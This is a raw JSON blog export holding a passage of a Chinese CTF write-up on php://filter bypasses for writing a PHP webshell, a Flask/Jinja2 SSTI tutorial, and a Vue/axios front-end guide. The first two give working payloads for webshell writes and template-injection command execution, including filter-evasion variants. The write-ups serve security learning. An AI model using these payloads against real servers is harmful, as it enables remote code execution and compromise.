1filename=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php&amp;txt=1?&lt;hp+pvela$(P_SO[T]1;)&gt;? 4.组合使用： 1filename=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE|string.rot13/resource=shell.php&amp;txt=1?&lt;uc ciryn$(C_FB[G]1;)&gt;? 还可以尝试使用srtip_tags+base64的方式进行绕过 1filename=php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&amp;txt=?&gt;PD9waHAgcGhwaW5mbygpOyA/Pg== 经过该方式构造的payload，会进行strip_tags，去除掉了前面的内容，之后再用base64解压了我们的内容。 讲完上面的，再回到wmctf的check in2，题目的源码为： 123456789101112&lt;?phperror_reporting(0);highlight_file(__FILE__);if (isset($_GET[&#x27;content&#x27;])) &#123; $content = $_GET[&#x27;content&#x27;]; if (preg_match(&#x27;/iconv|UCS|UTF|rot|quoted|base64|dechunk|\\.\\./i&#x27;, $content)) die(&#x27;hacker&#x27;); if (file_exists($content)) require_once($content); file_put_contents($content, &#x27;&lt;?php exit();&#x27; . $content);&#125; 过滤器过滤了很多，我们只剩下了压缩过滤器，我们可以通过zlib.inflate解压字符，之后再利用zlib.deflate压缩的方式getshell，str.tolower会在 1php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0deval($_GET[1]);?&gt; 除此之外，还有二次编码绕过的方式 1http://localhost/?content=php://filter/write=string.%7%32ot13|?&gt;&lt;?cuc cucvasb();?&gt;|/resource=shell.php 而昨天的比赛过滤了tolower,upper等等，甚至又把%过滤了，导致我们没法用上面两个payload了，但是我们依然可以利用zlib的 deflate，之后再利用url编码解析，得出如下payload 123php://filter/write=string.strip_tags|zlib.inflate|%3F%3E%b3%b1%2f%c8%28%50%28%ae%2c%2e%49%cd%d5%50%89%77%77%0d%89%8e%8f%d5%b4%b6%b7%03%3C%3F/resource=shell.php","categories":[],"tags":[]},{"title":"FlaskSSti","slug":"FlaskSSti","date":"2020-10-27T06:01:27.000Z","updated":"2020-10-27T06:09:46.441Z","comments":true,"path":"2020/10/27/FlaskSSti/","link":"","permalink":"http://example.com/2020/10/27/FlaskSSti/","excerpt":"一直对ssti比较模糊，遇见的时候都是网上去照抄payload去打，自己没有什么主动构造payload的能力，这次遇见一道题决定总结一些该怎么做","text":"一直对ssti比较模糊，遇见的时候都是网上去照抄payload去打，自己没有什么主动构造payload的能力，这次遇见一道题决定总结一些该怎么做 1.hackbar 自带的payload如何构成的第一件事情，就是搭建我们的环境： 123456789101112131415from flask import Flask, request, render_template_stringapp = Flask(__name__)@app.route(&#x27;/&#x27;, methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])def index(): id = request.args.get(&quot;id&quot;) html = &#x27;&#x27;&#x27;&lt;h1&gt;%s&lt;/h1&gt; &#x27;&#x27;&#x27; % (id) return render_template_string(html)if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=80) 这种就是最基本的flask，在flask当中jinjia的模板，我们使用两个花括号就可以允许一些基本的运算 用于执行if，for循环等等，那么我们一个最基本的payload的构造方式是该怎么触发呢？第一步，从config类触发，因为Flask里面自带 1http://localhost/?id=&#123;&#123; config.items() &#125;&#125; 通过这个类我们可以得到所有的flask的config~，而这一的意义好像不是很大？我们得不到很多东西，但是我们可以用这个作为跳板，执行下一步 1.__class__.__init__ __class方法属性的时候会只想该实例对应的类，此时config的类是Config,然后可以再去调用其它类属性，如果我们审计了源码，就可以知道我们此时的Config类位于config.py80多行，当我们执行__init__之后，便可以在下面的101行找到这么一行代码： 1rv = os.environ.get(variable_name) 也就是说，我们的config类当中含有os库的方法，如果我们直接使用是不行的，但我们可以通过globals函数先获取到它，于是得到： globals() 函数会以字典类型返回当前位置的全部全局变量,在交互模式下： 1__globals__ 于是我们拼接得到如下的payload: 1config.__class__.__init__.__globals__ 可以得到： 我们用下面这个方式来获取os库，利用__dict这个方法来查看os库哪些可以给我们进行使用 1.__globals__[&#x27;os&#x27;] 我们能够找到system，但是我们用该方法却无法得到回显，该方法只不过是成功的时候返回1，失败了则是返回0 执行如下： 12http://localhost/?id=&#123;&#123;%20config.__class__.__init__.__globals__[&#x27;os&#x27;].system(&#x27;dir()&#x27;)&#125;&#125; 得到1或者0对于我们来说意义不大，当然这样也可以进行盲注【，而popen则可以返回文件对象 os.popen 该方法不但执行命令还返回执行后的信息对象，是通过一个管道文件将结果返回。 output = os.popen(‘cat /proc/cpuinfo’) print output.read() 于是我们构造最终的payload： 1&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;dir()&#x27;).read()&#125;&#125; 1.2 config以外的思路其他的一些思路，首先，我们的config被过滤了，我们该怎么办呢？除此之外，我们还可以通过()和’’分别获取到tuple和str的初始化~ 12&#x27;&#x27;.__class__.__name__ #得到str()_.__class__.__name__ #tuple 这时引入base和mro的魔术方法 123__bases__ : 类的基类的元组，顺序为它们在基类列表中出现的顺序（基类就是Object类~）__mro__ :类的父类，从父类网上找，最终会找到基类，所以mro[-1]等价于__bases__ 这时候我们就想到的，我们既然得到了基类，是不是就想要所有的子类了呢？毕竟子类的内容我们更加感兴趣，我们最终的目标就是找到os库对吧。而python正好拥有这个魔术方法 1__subclasses__ #获取所有的子类方法 之后慢慢去寻找即可，该文章中有，在catch_warnnings模块下含有__builtins__，我们可以用这个去找eval： 12&#123;&#123; [].__class__.__mro__[-1].__subclasses__()[192].__init__.__globals__. __builtins__[&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;dir()&#39;).read()&quot;) &#125;&#125; 1.3总结做题的思路：总而言之，我们要么去找builtins函数下的eval，要么去找os。 2.谈谈过滤在某些情况下，会遇见各种各样的过滤，比如我们遇见对config的过滤，以及os过滤啊等等 2.1 过滤了os，system等的情况在这种情况下我们也不需慌，如果只是对中括号中可能用到的内容进行过滤的话，我们完全可以通过拼接绕过： 比如我们之前的payload修改成： 1?id=&#123;&#123; config.__init__.__globals__[&#x27;o&#x27;+&#x27;s&#x27;].popen(&#x27;dir&#x27;).read() &#125;&#125; 2.2 过滤了中括号这样的话,可以用getitem方法，该方法等价于一个迭代器的选择，开发者的原意是让人们可以用这个迭代对象,这篇文章讲的不错 1https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_24805141&#x2F;article&#x2F;details&#x2F;81411775 Python的魔法方法__getitem__ 可以让对象实现迭代功能，这样就可以使用for...in... 来迭代该对象了，同时也允许我们利用gettiem来直接选择内容,所以我们之前的payload： 1&#123;&#123; config.__init__.__globals__.__getitem__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read() &#125;&#125; 利用request起步 1&#123;&#123; request.__class__.__mro__.__getitem__(-1).__subclasses__().__getitem__(192).__init__.__globals__.__builtins__.__getitem__(&#x27;eval&#x27;)(&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read()&quot;) &#125;&#125; 2.3 过滤了.号这个可以使用attr来进行绕过了，直接给出绕过方法： 所以之前的payload进行对比： 12345[].__class__ = []|attr(__class__)&#123;&#123;[]|attr(&#x27;__class__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)() &#125;&#125;&#123;&#123; ([]|attr(&#x27;__class__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)())[190] &#125;&#125; 12&#123;&#123; ([]|attr(&#x27;__class__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)())[192]|attr(&#x27;__init__&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;__builtins__&#x27;)|attr(__getitem__)(&#x27;eval&#x27;) &#125;&#125; # 拼到这里拼不下去了。。请问有人知道为什么嘛,eval无论如何都取不到了 不知道为什么在我从上往下继续取值的时候，怎么都没法继续向下取值了。但是看见可以转换思路 2.5利用request​ 因为flask此时能允许用户自定义输出，十有八九是有request的，所以我们去利用这个也不是相当不错的 这里翻阅到了一个老外思路，但是他没给全。 1http://localhost/?id=&#123;&#123;request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)|attr(&#x27;__base__&#x27;) &#125;&#125;&amp;class=class&amp;usc=_&amp;init=init 利用request的思路去重新把payload拼出来 1?id=&#123;&#123;[][request[&#x27;args&#x27;][&#x27;class&#x27;]][request[&#x27;args&#x27;][&#x27;base&#x27;]][request[&#x27;args&#x27;][&#x27;subclasses&#x27;]]()[153][request[&#x27;args&#x27;][&#x27;dict&#x27;]][request[&#x27;args&#x27;][&#x27;init&#x27;]][request[&#x27;args&#x27;][&#x27;globals&#x27;]][request[&#x27;args&#x27;][&#x27;builtins&#x27;]][&#x27;eval&#x27;](request[&#x27;args&#x27;][&#x27;payload&#x27;])&#125;&#125;&amp;base=__base__&amp;subclasses=__subclasses__&amp;dict=__dict__&amp;init=__init__&amp;globals=__globals__&amp;builtins=__builtins__&amp;class=__class__&amp;payload=__import__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read() 2.4将中括号和.号都过滤情况下当然上面的难度都是相当简单的题目才会遇见了，在当前环境下，往往会过滤的相当严格，我们应该从flask本身出现的类开始找，比如题目可能验证的时候，仅仅验证我们输入的id。但是我们可以利用此，让flask读取header中的内容，这样就可以打破限制 我们可以先写一个脚本： 123456789101112http://localhost/?id=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125; &#123;% for b in c.__init__.__globals__.values() %&#125; &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125; &#123;% if &#x27;eval&#x27; in b.keys() %&#125; &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;dir()&quot;).read()&#x27;) &#125;&#125; &#123;% endif %&#125; &#123;% endif %&#125; &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 之后为了绕过括号的限制，采用这种方法： 这里给出一个payload： 12345678910111213141516171819&#123;% for c in []|attr(request.headers.x1)|attr(request.headers.x2)|attr(request.headers.x3)() %&#125; &#123;% if c|attr(request.headers.x4)==request.headers.x5 %&#125; &#123;%for d in ((c|attr(request.headers.x6)|attr(request.headers.x7))[request.headers.x8])%&#125; &#123;%if d==request.headers.x9%&#125;&#123;&#123;((c|attr(request.headers.x6)|attr(request.headers.x7))[request.headers.x8])[d](request.headers.x13)&#125;&#125; &#123;% endif %&#125; &#123;% endfor %&#125; &#123;% endif%&#125;&#123;% endfor %&#125; x13: __import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()x9: evalx8: __builtins__x7: __globals__x6: __init__x5: catch_warningsx4: __name__x3: __subclasses__x2: __base__x1: __class__","categories":[],"tags":[]},{"title":"Vue总结","slug":"Vue总结","date":"2020-10-25T13:28:49.000Z","updated":"2020-10-25T13:43:57.379Z","comments":true,"path":"2020/10/25/Vue总结/","link":"","permalink":"http://example.com/2020/10/25/Vue%E6%80%BB%E7%BB%93/","excerpt":"Vue part总结了前端项目的搭建，以及自己在这次作品中学到了什么","text":"Vue part总结了前端项目的搭建，以及自己在这次作品中学到了什么 Vue我认为学下来就是很爽，基本上不用再各种去绑定JS当中的dom元素了（getElementById什么的） 其中基础源码，有一个index.html 1.index.html123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1.0&quot;&gt; &lt;link rel=&quot;icon&quot; href=&quot;&lt;%= BASE_URL %&gt;favicon.ico&quot;&gt; &lt;title&gt;&lt;%= htmlWebpackPlugin.options.title %&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;noscript&gt; &lt;strong&gt;We&#x27;re sorry but &lt;%= htmlWebpackPlugin.options.title %&gt; doesn&#x27;t work properly without JavaScript enabled. Please enable it to continue.&lt;/strong&gt; &lt;/noscript&gt; &lt;div id=&quot;app&quot;&gt;&lt;/div&gt; &lt;!-- built files will be auto injected --&gt; &lt;/body&gt;&lt;/html&gt; 启动的时候有一个main.js，APP.vue等等。现在讲一下我是怎么做下来的，我利用到的框架是antdv，再package.json当中可以找到 2.package.json1234567891011121314151617181920212223242526272829303132&quot;dependencies&quot;: &#123; &quot;@antv/data-set&quot;: &quot;^0.11.7&quot;, &quot;@antv/g2&quot;: &quot;^4.0.15&quot;, &quot;@sven0706/websocket&quot;: &quot;^1.0.1&quot;, &quot;ant-design-vue&quot;: &quot;^1.6.5&quot;, &quot;axios&quot;: &quot;^0.20.0&quot;, &quot;core-js&quot;: &quot;^3.6.5&quot;, &quot;echarts&quot;: &quot;^4.9.0&quot;, &quot;html2canvas&quot;: &quot;^1.0.0-rc.7&quot;, &quot;js-cookie&quot;: &quot;^2.2.1&quot;, &quot;jspdf&quot;: &quot;^2.1.1&quot;, &quot;less&quot;: &quot;^3.12.2&quot;, &quot;less-loader&quot;: &quot;^7.0.1&quot;, &quot;rc-resize-observer&quot;: &quot;^0.2.5&quot;, &quot;react&quot;: &quot;^16.13.1&quot;, &quot;react-dom&quot;: &quot;^16.13.1&quot;, &quot;react-window&quot;: &quot;^1.8.5&quot;, &quot;vant&quot;: &quot;^2.10.9&quot;, &quot;vue&quot;: &quot;^2.6.11&quot;, &quot;vue-print-nb&quot;: &quot;^1.5.0&quot;, &quot;vue-router&quot;: &quot;^3.4.5&quot;, &quot;vuex&quot;: &quot;^3.5.1&quot; &#125;, &quot;devDependencies&quot;: &#123; &quot;@vue/cli-plugin-babel&quot;: &quot;~4.5.0&quot;, &quot;@vue/cli-plugin-eslint&quot;: &quot;~4.5.0&quot;, &quot;@vue/cli-service&quot;: &quot;~4.5.0&quot;, &quot;babel-eslint&quot;: &quot;^10.1.0&quot;, &quot;eslint&quot;: &quot;^6.7.2&quot;, &quot;eslint-plugin-vue&quot;: &quot;^6.2.2&quot;, &quot;vue-template-compiler&quot;: &quot;^2.6.11&quot; &#125;, 要用的时候再项目根目录下cnpm -i即可。 讲一下路由该怎么做把，首先创建一个 3.router.js1234//引入vueimport Vue from &#x27;vue&#x27;;//引入vue-routerimport VueRouter from &#x27;vue-router&#x27;; 在Vue当中，所有需要引用的东西需要用Vue.use之后才会生效 故我们构造之后的代码框架大致如下： 1234567891011121314151617//引入vueimport Vue from &#x27;vue&#x27;;//引入vue-routerimport VueRouter from &#x27;vue-router&#x27;;Vue.use(VueRouter)//引用page1页面import upload from &#x27;./components/upload.vue&#x27;;import login from &#x27;./components/login.vue&#x27;;//定义routes路由的集合，数组类型const routes=[ //单个路由均为对象类型，path代表的是路径，component代表组件 &#123;path:&#x27;/upload&#x27;,component:upload&#125;, &#123;path:&#x27;/login&#x27;,component:login&#125;, 一个Vue文件的格式如下： 4.主入口123456789101112131415161718&lt;template&gt; &lt;div id&#x3D;&quot;app&quot;&gt; &lt;router-view&#x2F;&gt; &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;&lt;script&gt;export default &#123; name: &#39;App&#39;, &#125;&lt;&#x2F;script&gt;&lt;style&gt;&lt;&#x2F;style&gt; 在template当中构造HTML的代码，script当中构造当前页面的JS，而style设置中写css。如果不做限定，CSS将会是全局生效的！ 而APP作为主页面，只需要写一句话即可： 1&lt;router-view/&gt; 这一句话的意思代码将页面内容托管给Vue，根据vue的Router来显示内容 而Router的设置在main.js当中（实际上，几乎所有的设置都放在main.js当中进行统一设置） 1234new Vue(&#123; router, render: h =&gt; h(App),&#125;).$mount(&#x27;#app&#x27;) 在main.js导入的模块可以全项目生效，如果想要普通的生效一个模块，这样构造： 123456789101112import &#123; Button, Table, Menu, Switch,Icon,Layout,Upload,Breadcrumb,FormModel,Input,Divider,message,Form,Alert,Spin,Modal &#125; from &#x27;ant-design-vue&#x27;//在下面：Vue.use(Modal)Vue.use(Spin)Vue.use(Alert)Vue.use(Form)Vue.use(axios)Vue.use(htmlToPdf)Vue.use(Divider)Vue.use(Input)Vue.use(FormModel) 如果想要修改Vue默认的设置，例如我们导入axios的时候这样构造： 12import axios from &#x27;axios&#x27;Vue.prototype.$http = axios 之后我构造了一个公共使用的Vue模板，也就是菜单栏的插件，我是创建了一个commons文件夹，并写在里面 5.插槽12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;template&gt; &lt;a-layout id=&quot;components-layout-demo-side&quot; style=&quot;min-height: 100vh&quot;&gt; &lt;a-layout-sider v-model=&quot;collapsed&quot; width=&quot;12%&quot; collapsible&gt; &lt;div class=&quot;logo&quot; /&gt; &lt;a-menu theme=&quot;dark&quot; :default-selected-keys=&quot;[&#x27;1&#x27;]&quot; mode=&quot;inline&quot;&gt; &lt;a-menu-item key=&quot;1&quot;&gt; &lt;router-link to=&quot;upload&quot;&gt;&lt;a-icon type=&quot;cloud-download&quot; /&gt; &lt;span&gt; 文件上传 &lt;/span&gt; &lt;/router-link&gt; &lt;/a-menu-item&gt; &lt;a-sub-menu key=&quot;sub1&quot;&gt; &lt;span slot=&quot;title&quot;&gt;&lt;a-icon type=&quot;area-chart&quot; /&gt; &lt;span&gt; 数据分析 &lt;/span&gt; &lt;/span&gt; &lt;a-menu-item key=&quot;2&quot;&gt; &lt;router-link to=&quot;report&quot;&gt; 日志分析 &lt;/router-link&gt; &lt;/a-menu-item&gt; &lt;a-menu-item key=&quot;3&quot;&gt; &lt;router-link to=&quot;getpdf&quot;&gt; 获取报告 &lt;/router-link&gt; &lt;/a-menu-item&gt; &lt;/a-sub-menu&gt; &lt;a-sub-menu key=&quot;sub2&quot;&gt; &lt;span slot=&quot;title&quot;&gt;&lt;a-icon type=&quot;dashboard&quot; /&gt;&lt;span&gt;立体数据&lt;/span&gt;&lt;/span&gt; &lt;a-menu-item key=&quot;5&quot;&gt; &lt;router-link to=&quot;attackaddress&quot;&gt; 攻击溯源 &lt;/router-link&gt; &lt;/a-menu-item&gt; &lt;a-menu-item key=&quot;8&quot;&gt; &lt;router-link to=&quot;watchlog&quot;&gt; 实时监控 &lt;/router-link&gt; &lt;/a-menu-item&gt; &lt;/a-sub-menu&gt; &lt;a-menu-item key=&quot;9&quot;&gt; &lt;router-link to=&quot;setting&quot;&gt; &lt;a-icon type=&quot;setting&quot; /&gt; &lt;span&gt;系统设置&lt;/span&gt; &lt;/router-link&gt; &lt;/a-menu-item&gt; &lt;a-menu-item key=&quot;10&quot; @click=&quot;showModal&quot;&gt; &lt;a-icon type=&quot;login&quot; /&gt; &lt;span &gt;登出&lt;/span&gt; &lt;a-modal v-model=&quot;visible&quot; title=&quot;Basic Modal&quot; @ok=&quot;handleOk&quot;&gt; &lt;p&gt;是否确定登出？&lt;/p&gt; &lt;/a-modal&gt; &lt;/a-menu-item&gt; &lt;/a-menu&gt; &lt;/a-layout-sider&gt; &lt;a-layout&gt; &lt;a-layout-header theme=dark &gt; &lt;/a-layout-header&gt; &lt;!-- 上面是在导航栏最顶端加东西 --&gt; &lt;a-layout-content style=&quot;margin: 0 16px&quot;&gt; &lt;slot&gt;&lt;/slot&gt; &lt;/a-layout-content&gt; &lt;a-layout-footer style=&quot;text-align: center&quot;&gt; Ant Design ©2018 Created by Ant UED &lt;/a-layout-footer&gt; &lt;/a-layout&gt; &lt;/a-layout&gt;&lt;/template&gt;&lt;script&gt; 需要注意的是： 1&lt;slot&gt;&lt;/slot&gt; 在Vue当中，这个相当于一个插槽，也就是，呃，类似一个include函数，我们如果想要把他当作模板的话就需要这样写，比如我们的report.vue 1234567import menus from &#x27;../commons/menu&#x27;&lt;menu&gt;&lt;/menu&gt;//在下面导入，之后再html当中使用即可components:&#123; menus, &#125;, 6.路由守卫我们前端肯定是要鉴权的吧，不然用户就可对前端为所欲为了，故我们构造一个局部守卫是这样的： 123456beforeRouteEnter(to,from,next) &#123; axios.post(&#x27;/report&#x27;).then(res =&gt;&#123; if (res.data == 0) next(&#123; path:&#x27;/&#x27; &#125;); else next(); &#125;) &#125;, 这样的话，再访问该路由，离开路由的时候都会先访问一次页面，我们后端写好代码，如果用户没有登陆的话，就会返回到index页面了。 7.期待值这个理解起来单靠嘴说较为僵硬，需要实战中使用才可以领悟的清楚，比如我们的html代码中构造如下： 1&lt;a-button type=&quot;danger&quot; :style=&quot;&#123;margin:&#x27;-20px 0px 0px 200px&#x27;&#125;&quot; @click=&quot;ExportSavePdf(htmlTitle,nowTime)&quot;&gt;报告生成&lt;/a-button&gt; （通过Vue框架，我们可以使用@click的方法来处理各种事件，之后填入一个函数，并写入函数的实参，而实参不一定是一定出现的，所以我们的实参可能会出现为null的情况，而Vue不想出现这种情况，所以要求我们填入默认值，也就是期待值，当我们没有填入参数的时候自动填入的参数 12345678data() &#123; return &#123; data, columns, htmlTitle: &#x27;report&#x27;, keyName: &#x27;&#x27;, &#125;; &#125;, 8.设置默认值有的时候，我们可能想在用户访问之前的时候直接获取数据，这样的话就可以直接拿到数据了，于是我们可以通过如下方法： 123mounted() &#123; // this.drawChart(); &#125; 以这种方式填入的值，当用户访问页面的时候便会自动进行调用。例子： 1234567axios.post(&#x27;/setting&#x27;).then(res=&gt;&#123; this.usersData(res.data); // location.reload() &#125;).catch(err=&gt;&#123; // console.log(err) &#125;) &#125; 9.实现监听数据在之前的layui的时候，因为我不会对数据进行绑定，所以往往造成自己要写很多的type=hiden，或者必须构造form表单的情况，而使用框架之后可以通过v-model操作简单的实现这个效果， 例如我们可以构造如下代码： 123456789101112131415161718192021222324252627282930313233343536&lt;a-form-model-item style=&quot;margin: 0px 10px 0px 00px&quot; class=&quot;selectAddress&quot;&gt; &lt;a-input type=&quot;password&quot; placeholder=&quot;logKey&quot; v-model=&quot;attackAddressName&quot;&gt; &lt;a-icon slot=&quot;prefix&quot; type=&quot;lock&quot; style=&quot;color:rgba(0,0,0,.25)&quot; /&gt; &lt;/a-input&gt; &lt;/a-form-model-item&gt; &lt;a-form-model-item class=&quot;selectButton&quot;&gt; &lt;a-button type=&quot;primary&quot; html-type=&quot;submit&quot; @click=&quot;selectAddress($event)&quot; &gt; 添加 &lt;/a-button&gt; &lt;/a-form-model-item&gt;//在JS代码中：selectAddress:function(event)&#123; // console.log(this.attackAddressName) let formAddress = new FormData(); formAddress.append(&#x27;logname&#x27;, this.attackAddressName) // console.log(formAddress.get(&#x27;logname&#x27;)) this.spinning = true; axios.post(&#x27;/setting&#x27;,formAddress).then(res =&gt;&#123; let earchData =JSON.parse(res.data) // console.log(res.data) this.china(earchData); this.spinning = false; &#125;).catch(err =&gt;&#123; console.log(err); &#125;) &#125; 我们可以发现，我并没有写form表单，而我依然可以实现提交数据，是因为使用v-model监听之后，该input输入框的内容被JS实时监控着。 10.监听的妙用利用监听，我们可以很轻松的完成对一些看起来很酷炫的特效，比如，如果用户想要提交点击一个按钮，就需要填写几个input框，并且如果框是空的，还可以给出提示等等，这里举出一个例子，比如： 123456789101112&lt;!-- 用户名判断 --&gt; &lt;a-form-item :validate-status=&quot;userNameError() ? &#x27;error&#x27; : &#x27;&#x27;&quot; :help=&quot;userNameError() || &#x27;&#x27;&quot;&gt; &lt;a-input v-decorator=&quot;[ &#x27;userName&#x27;, &#123; rules: [&#123; required: true, message: &#x27;Please input your username!&#x27; &#125;] &#125;, ]&quot; placeholder=&quot;Username&quot; &gt; &lt;a-icon slot=&quot;prefix&quot; type=&quot;user&quot; style=&quot;color:rgba(0,0,0,.25)&quot; /&gt; &lt;/a-input&gt; &lt;/a-form-item&gt; 顺便一提， 用:引号写入的东西，一般我们是用于条件判断，比如在这里，我们就是利用这个去判断userNameError的状况 在methods当中，我们构造如下代码： 1234userNameError() &#123; const &#123; getFieldError, isFieldTouched &#125; = this.form; return isFieldTouched(&#x27;userName&#x27;) &amp;&amp; getFieldError(&#x27;userName&#x27;); &#125;, 在data当中： 123456data() &#123; return &#123; hasErrors, form: this.$form.createForm(this, &#123; name: &#x27;getWebsocket&#x27; &#125;), &#125;; &#125;, 官方是如下解释的： v-decorator 是 Ant Design 的控件验证属性。 经过 getFieldDecorator 或 v-decorator 包装的控件，表单控件会自动添加 value（或 valuePropName 指定的其他属性） onChange（或 trigger 指定的其他属性），数据同步将被 Form 接管，这会导致以下结果： 你不再需要也不应该用 onChange 来做同步，但还是可以继续监听 onChange 等事件。 你不能用控件的 value defaultValue 等属性来设置表单域的值，默认值可以用 getFieldDecorator 或 v-decorator 里的 initialValue。 你不应该用 v-model，可以使用 this.form.setFieldsValue 来动态改变表单值。 也就是说这种方式是吧form由Vue彻底托管了~和之前的不同，会自动判断是否存在值，如果不存在的话，将会调用v-decorator。当然这种方式我是比较模糊的，真要说我比较理解的是另外一个形式 11.v-model的妙用在html当中写下： 12345678910111213141516171819&lt;a-form-model-item style=&quot;margin: 0px 10px 0px 00px&quot; class=&quot;selectAddress&quot;&gt; &lt;a-input type=&quot;password&quot; placeholder=&quot;logKey&quot; v-model=&quot;attackAddressName&quot;&gt; &lt;a-icon slot=&quot;prefix&quot; type=&quot;lock&quot; style=&quot;color:rgba(0,0,0,.25)&quot; /&gt; &lt;/a-input&gt; &lt;/a-form-model-item&gt; &lt;a-form-model-item class=&quot;selectButton&quot;&gt; &lt;a-button type=&quot;primary&quot; html-type=&quot;submit&quot; @click=&quot;selectAddress($event)&quot; &gt; 添加 &lt;/a-button&gt; &lt;/a-form-model-item&gt;&lt;a-alert message=&quot;输入key，即可自动溯源&quot; type=&quot;info&quot; class=&quot;fontKey&quot; /&gt; &lt;a-spin size=&quot;large&quot; class=&quot;spinner&quot; :spinning=&quot;spinning&quot; :delay=&quot;delayTime&quot; /&gt; 注意这里的spinning，我们给她进行托管，如果可以的话，而spinning的期望默认值在data当中构造： 1234567data()&#123; return&#123; attackAddressName:&#x27;&#x27;, spinning: false, delayTime: 500, &#125; &#125;, 而当我们点击按钮发送数据之后： 123456789101112131415161718selectAddress:function(event)&#123; // console.log(this.attackAddressName) let formAddress = new FormData(); formAddress.append(&#x27;logname&#x27;, this.attackAddressName) // console.log(formAddress.get(&#x27;logname&#x27;)) this.spinning = true; axios.post(&#x27;/setting&#x27;,formAddress).then(res =&gt;&#123; let earchData =JSON.parse(res.data) // console.log(res.data) this.china(earchData); this.spinning = false; &#125;).catch(err =&gt;&#123; console.log(err); &#125;) &#125; 一旦数据成功发送过去，我们就将spinning的值改成true，这样就可以显示了，当获取数据之后，我们就改成false，让他消失即可 axios part1.aiox发送数据axios是一个组件，用于发送数据给后端，相当好用，我们为了降低代码耦合性，应该抓门建立一个axios文件夹，并且设置一个http.js，各种各样的设置我们都在axios当中进行配置即可： 12345import axios from &#x27;axios&#x27;axios.defaults.baseURL = &#x27;http://localhost:8081&#x27;;axios.defaults.timeout = 1000000;axios.defaults.withCredentials = true 例如这样，就是设置了默认的url，设置超时事件，带上cookies等等，而axios的使用也很简单，构造如下： 12345678910111213axios.post(&quot;/login&quot;,formData,config).then(res =&gt; &#123; if(res.data == 0 )&#123; alert(&quot;账号或密码错误！&quot;) &#125; else&#123; this.$message.success(` login successfully!`); router.push(&#123; path:&quot;/upload&quot; &#125;) &#125; &#125;).catch(err =&gt; &#123; console.log(err) &#125;); axios.get/post axios.get().theml().catch() 在then和cat当中去写别的东西，上图当中的res.data为API给回来的数据，成功之后router.push就可以让页面进行跳转了 总结感觉自己是边学边写的，学到后面的时候感觉之前的东西还可以做得更好，但是蓝狗了，已经不想动了orz","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"}]}],"categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"}]}